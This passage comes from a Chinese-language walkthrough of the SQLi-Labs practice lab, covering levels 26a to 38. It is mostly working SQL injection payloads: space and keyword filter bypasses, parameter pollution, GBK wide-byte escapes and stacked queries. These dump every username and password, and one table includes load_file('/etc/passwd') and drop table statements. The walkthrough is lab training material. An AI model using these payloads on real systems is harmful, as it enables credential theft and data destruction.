闭合后面的单引号和括号。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;)%a0UNION%a0SELECT%a01,group_concat(concat_ws(&quot;:&quot;,username,passwoORrd)),3%a0FROM%a0users%a0WHERE%a0(&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723161531981.png" alt="image-20240723161531981"></p><h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><p>注入正常的参数，网页返回对应 id 的正常信息。单引号没有被过滤，使用两个单引号分别闭合前后的引号。网页回显正常的内容，说明该网页存在单引号闭合的字符型注入。</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723161934354.png" alt="image-20240723161934354"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723162152441.png" alt="image-20240723162152441"></p><p>测试以下所有的参数，这次 “OR”、“AND” 没被过滤，不过所有的注释符和空格还是被过滤了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;#</span><br><span class="line">?id=1&#x27;/*</span><br><span class="line">?id=1&#x27;/</span><br><span class="line">?id=1&#x27;\</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723162243946.png" alt="image-20240723162243946"></p><p>获取数据库信息</p><p>此处可以使用 updatexml() 报错注入，也可以使用 URL 编码来代替空格后用 UNION 注入。判断有几列可用，别忘了 “ORDER” 中的 “or” 被过滤掉了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;%a0ORDER%a0BY%a03||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723162336377.png" alt="image-20240723162336377"></p><p>判断回显位置，注意该注入返回了错误信息。从提示可以看到，“SELECT” 和 “UNION” 统统被过滤了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;%a0UNION%a0SELECT%a01,2,3%a0or%a0&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723162354280.png" alt="image-20240723162354280"></p><p>可以使用<strong>大小写绕过</strong>来绕过过滤机制，也就是使用的 “SELECT” 和 “UNION” 是大小写混杂的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;%a0UNiON%a0SElECT%a01,2,3%a0or%a0&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723162430825.png" alt="image-20240723162430825"></p><p>爆数据库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;%a0UNiON%a0SELeCT%a01,database(),3%a0or%a0&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723162446825.png" alt="image-20240723162446825"></p><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;%a0UNiON%a0SELeCT%a01,group_concat(table_name),3%a0FROM%a0information_schema.tables%a0WHERE%a0table_schema = &#x27;security&#x27;%a0or%a0&#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723162508586.png" alt="image-20240723162508586"></p><p>爆字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;%a0UNiON%a0SELeCT%a01,group_concat(column_name),3%a0FROM%a0information_schema.columns%a0WHERE%a0table_schema=&#x27;security&#x27;%a0AND%a0table_name=&#x27;users&#x27;%a0or%a0&#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723162525249.png" alt="image-20240723162525249"></p><p>获取目标信息</p><p>获取所有用户名和对应的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;%a0UNiON%a0SELeCT%a01,group_concat(concat_ws(&quot;:&quot;,username,password)),3%a0FROM%a0users%a0WHERE%a0&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723162602472.png" alt="image-20240723162602472"></p><h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less 27a"></a>Less 27a</h3><p>注入正常的参数，网页返回对应 id 的正常信息。单引号没有被过滤，无论使用几个单引号闭合网页回显正常的内容，说明不是用单引号闭合。注入双引号，网页无任何回显。注入两个双引号闭合，网页回显正常信息，说明此处存在双引号闭合的字符型盲注</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723162743496.png" alt="image-20240723162743496"></p><p>除了闭合的符号不同，其他的和 Less 27 一样。判断有几列可用。（需要把php的这个开关打开才能正常回显）</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723163140924.png" alt="image-20240723163140924"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;%a0ORDER%a0BY%a03or%a0&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723163044256.png" alt="image-20240723163044256"></p><p>判断回显位置（需要把这个开关关掉才能正常回显）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&quot;%a0UNiON%a0SElECT%a01,2,3%a0or%a0&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723163140924.png" alt="image-20240723163140924"></p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723163246906.png" alt="image-20240723163246906"></p><p>爆数据库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&quot;%a0UNiON%a0SELeCT%a01,database(),3%a0or%a0&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723163311012.png" alt="image-20240723163311012"></p><p>爆表名</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723163327417.png" alt="image-20240723163327417"></p><p>爆字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&quot;%a0UNiON%a0SELeCT%a01,group_concat(column_name),3%a0FROM%a0information_schema.columns%a0WHERE%a0table_schema=&#x27;security&#x27;%a0AND%a0table_name=&#x27;users&#x27;%a0or%a0&quot;1&quot;=&quot;2</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723163345613.png" alt="image-20240723163345613"></p><p>获取目标信息</p><p>获取所有用户名和对应的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&quot;%a0UNiON%a0SELeCT%a01,group_concat(concat_ws(&quot;:&quot;,username,password)),3%a0FROM%a0users%a0WHERE%a0&quot;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723163417650.png" alt="image-20240723163417650"></p><h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><p>注入正常的参数，网页返回对应 id 的正常信息。单引号没有被过滤，使用两个单引号闭合返回正常的信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>进一步测试闭合类型，使用单引号和括号闭合回显正常的信息，说明网页是使用单引号和括号进行闭合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;) OR (&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723163606800.png" alt="image-20240723163606800"></p><p>获取数据库信息</p><p>除了闭合的符号不同，其他的和 Less 27 一样。判断有几列可用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)%a0ORDER%a0BY%a03%a0or%a0(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723163645178.png" alt="image-20240723163645178"></p><p>判断回显位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;)%a0UNiON%a0SElECT%a01,2,3%a0or%a0(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723163710608.png" alt="image-20240723163710608"></p><p>爆数据库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;)%a0UNiON%a0SELeCT%a01,database(),3%a0or%a0(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723163729472.png" alt="image-20240723163729472"></p><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;)%a0UNiON%a0SELeCT%a01,group_concat(table_name),3%a0FROM%a0information_schema.tables%a0WHERE%a0table_schema = &#x27;security&#x27;%a0or%a0(&#x27;1&#x27;)=(&#x27;2</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723163747138.png" alt="image-20240723163747138"></p><p>爆字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;)%a0UNiON%a0SELeCT%a01,group_concat(column_name),3%a0FROM%a0information_schema.columns%a0WHERE%a0table_schema=&#x27;security&#x27;%a0AND%a0table_name=&#x27;users&#x27;%a0or%a0(&#x27;1&#x27;)=(&#x27;2</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723163806259.png" alt="image-20240723163806259"></p><p>获取目标信息</p><p>获取所有用户名和对应的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;)%a0UNiON%a0SELeCT%a01,group_concat(concat_ws(&quot;:&quot;,username,password)),3%a0FROM%a0users%a0WHERE%a0(&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723163833217.png" alt="image-20240723163833217"></p><h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><p>注入正常的参数，网页返回对应 id 的正常信息。单引号没有被过滤，使用一个单引号闭合无回显。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure><p>使用两个单引号闭合回显正常，说明此处存在单引号闭合的盲注</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>进一步测试闭合类型，使用单引号和括号闭合回显正常的信息，说明网页是使用单引号和括号进行闭合。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;) OR (&#x27;1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723163954361.png" alt="image-20240723163954361"></p><p>注入过程和 Less 28 完全一样。这里就只放代码了</p><p>判断有几列可用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)%a0ORDER%a0BY%a03%a0or%a0(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure><p>判断回显位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;)%a0UNiON%a0SElECT%a01,2,3%a0or%a0(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure><p>爆数据库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;)%a0UNiON%a0SELeCT%a01,database(),3%a0or%a0(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;)%a0UNiON%a0SELeCT%a01,group_concat(table_name),3%a0FROM%a0information_schema.tables%a0WHERE%a0table_schema = &#x27;security&#x27;%a0or%a0(&#x27;1&#x27;)=(&#x27;2</span><br></pre></td></tr></table></figure><p>爆字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;)%a0UNiON%a0SELeCT%a01,group_concat(column_name),3%a0FROM%a0information_schema.columns%a0WHERE%a0table_schema=&#x27;security&#x27;%a0AND%a0table_name=&#x27;users&#x27;%a0or%a0(&#x27;1&#x27;)=(&#x27;2</span><br></pre></td></tr></table></figure><p>获取目标信息</p><p>获取所有用户名和对应的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=9999&#x27;)%a0UNiON%a0SELeCT%a01,group_concat(concat_ws(&quot;:&quot;,username,password)),3%a0FROM%a0users%a0WHERE%a0(&#x27;1</span><br></pre></td></tr></table></figure><h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><p>此关会对输入的参数进行校验是否为数字，但是在对参数值进行校验之前的提取时候只提取了第一个id值，如果我们有两个id参数，第一个id参数正常数字，第二个id参数进行sql注入。sql语句在接受相同参数时候接受的是后面的参数值。</p><p>爆数据表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-2%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--+</span><br></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-2%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=database() and table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure><p>爆账户密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-2%27%20union%20select%201,group_concat(password,username),3%20from%20users--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723164529856.png" alt="image-20240723164529856"></p><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><p>此关和Less-29差不多，将单引号换成双引号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆表</span><br><span class="line">?id=1&amp;id=-2&quot;%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--+</span><br><span class="line">爆字段</span><br><span class="line">?id=1&amp;id=-2&quot;%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=database() and table_name=&#x27;users&#x27;--+</span><br><span class="line">爆账户密码</span><br><span class="line">?id=1&amp;id=-2&quot;%20union%20select%201,group_concat(password,username),3%20from%20users--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723164640335.png" alt="image-20240723164640335"></p><h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h3><p>三十一关和三十关差不多，多了一个括号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆表</span><br><span class="line">?id=1&amp;id=-2&quot;)%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--+</span><br><span class="line">爆字段</span><br><span class="line">?id=1&amp;id=-2&quot;)%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=database() and table_name=&#x27;users&#x27;--+</span><br><span class="line">爆账户密码</span><br><span class="line">?id=1&amp;id=-2&quot;)%20union%20select%201,group_concat(password,username),3%20from%20users--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240723164803666.png" alt="image-20240723164803666"></p><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>输入id&#x3D;1，页面正常显示，加入单引号，发现输入的单引号直接被转义成<code>/</code>了，在一般情况下，这里是不存在SQL注入的，不过有一个特殊点，那就是当数据库的编码为GBK时，可以使用宽字节注入</p><p>宽字节的格式是在地址后先加一个%df，再加单引号，因为反斜杠的编码为%5c，而在GBK编码中，%df%5c是繁体字“連”，所以这时，单引号成功逃逸，报出MySQL数据库的错误。</p><p>查看源码，发现的确使用了GBK编码，这里我们可以在单引号前面输入%df让单引号成功逃逸</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724083053828.png" alt="image-20240724083053828"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724083255149.png" alt="image-20240724083255149"></p><p>根据错误显示判断闭合方式为<code>’–-+</code>，且为字符型注入</p><p>判断回显位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724083344859.png" alt="image-20240724083344859"></p><p>爆数据库和表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724083446972.png" alt="image-20240724083446972"></p><p>这里注意，单引号被转义了，不能输入<code>table_schema=&#39;security&#39;</code>，这里输入的是<code>table_schema=database()</code>,只是一个简单的联合查询，意思一模一样</p><p>查看字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724083654812.png" alt="image-20240724083654812"></p><p>这里也需要注意，不能出现单引号，于是我们在users前面加入0x，然后将users转化为16进制</p><p>查看数据内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(username,id,password) from users--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724083800780.png" alt="image-20240724083800780"></p><h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><p>本关和Less-32一模一样</p><h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><p>注入正常的参数，网页回显正常信息。注入单引号对参数进行闭合，网页虽然返回了正确的信息，但是对单引号进行了转义。</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724085136594.png" alt="image-20240724085136594"></p><p>由于这里是使用 POST 方法提交参数，使用 Brup 抓包下来，得到提交的参数格式。</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724085209840.png" alt="image-20240724085209840"></p><p>仍让使用 %df 让单引号逃逸，网页返回错误信息。</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724085253223.png" alt="image-20240724085253223"></p><p>把后面的内容注释掉，网页回显登录失败，说明此处有单引号闭合的字符型注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin%df&#x27;--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724085421871.png" alt="image-20240724085421871"></p><p>获取数据库信息</p><p>判断回显位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1%df&#x27;union select 1,2--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724085517663.png" alt="image-20240724085517663"></p><p>爆数据库和数据表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1%df&#x27;union select database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724085636088.png" alt="image-20240724085636088"></p><p>爆字段名，这里注意也是要将数据表名进行16进制编码，前缀加上0x</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1%df&#x27;union select database(),group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724085904183.png" alt="image-20240724085904183"></p><p>爆数据信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1%df&#x27;union select database(),group_concat(username,id,password) from users--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724090158277.png" alt="image-20240724090158277"></p><h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><p>使用addslashes函数对于输入的内容进行转义，但是id参数没有引号，主要影响在与后续爆字段时候需要用的表名加了引号，只需将表名换成十六进制编码就行，直接使用联合查询就可以了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724091039352.png" alt="image-20240724091039352"></p><p>判断回显位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724091057315.png" alt="image-20240724091057315"></p><p>查看数据库和数据表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724091344197.png" alt="image-20240724091344197"></p><p>查看数据内容（记得将数据表进行16进制编码，前缀0x）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=0x7573657273</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724091610096.png" alt="image-20240724091610096"></p><p>查看数据内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,database(),group_concat(username,id,password) from users</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724091701307.png" alt="image-20240724091701307"></p><h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><p>使用mysql_real_escape_string函数对于特殊字符进行转义。id参数是单引号，和前面三十二关一样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看回显位</span><br><span class="line">?id=-1%df&#x27; union select 1,2,3--+</span><br><span class="line">查看数据库和数据表</span><br><span class="line">?id=-1%df&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br><span class="line">查看字段</span><br><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+</span><br><span class="line">查看数据内容</span><br><span class="line">?id=admin%df&#x27;union select 1,2,group_concat(username,id,password) from users--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724092004226.png" alt="image-20240724092004226"></p><h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><p>注入正常的参数，网页回显正常信息。注入单引号对参数进行闭合，网页虽然返回了正确的信息，但是对单引号进行了转义。仍让使用 %df 让单引号逃逸，网页返回错误信息。</p><p>抓包，改数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=%df&#x27;&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724092532324.png" alt="image-20240724092532324"></p><p>把后面的内容注释掉，网页回显登录失败，说明此处有单引号闭合的字符型注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=%df&#x27;--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724092613066.png" alt="image-20240724092613066"></p><p>注入过程与Less-34完全一样，此处不再赘述</p><h2 id="第三部分：Stacked-Injections"><a href="#第三部分：Stacked-Injections" class="headerlink" title="第三部分：Stacked Injections"></a>第三部分：Stacked Injections</h2><h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><p>输入id数，页面正常回显，输入单引号，页面报错</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724093317731.png" alt="image-20240724093317731"></p><p>根据错误信息判断闭合方式为’–+，并且为字符型注入</p><p>确定回显位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724093406444.png" alt="image-20240724093406444"></p><p>这不就是Less-1？！难道你真的以为我会用Less-1的方法过关吗？NONONO</p><p>查看源码后发现源代码存在mysqli_multi_query函数，该函数支持多条sql语句同时进行</p><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724093705720.png" alt="image-20240724093705720"></p><p>所以，堆叠注入，启动！！！</p><h4 id="小科普"><a href="#小科普" class="headerlink" title="小科普"></a>小科普</h4><p><strong>堆叠注入攻击</strong><br>堆叠查询注入攻击可以执行多条语句，多语句之间以分号隔开。堆叠查询注入就是利用这个特点，在第二个SQL语句中构造自己的要执行的语句</p><table><thead><tr><th>功能</th><th>语句</th></tr></thead><tbody><tr><td>新建一个表</td><td>select * from users;create table A like users;</td></tr><tr><td>删除创建的A表</td><td>select * from users;drop table A;</td></tr><tr><td>查询数据</td><td>select * from users;select B,C,D;</td></tr><tr><td>加载文件</td><td>select * from users;select load_file(‘&#x2F;etc&#x2F;passwd’);</td></tr><tr><td>增加一条数据</td><td>select * from users;insert into users values(18,’zhong’,’zhong’);</td></tr></tbody></table><p>开始注入</p><p>在security库下增加一个表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;; create table test like users;–-+</span><br></pre></td></tr></table></figure><p><img src="/2024/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/image-20240724094035177.png" alt="image-20240724094035177"></p><p>页面正常回显，应该已经添加成功了</p><p>查看数据库</p><p><img 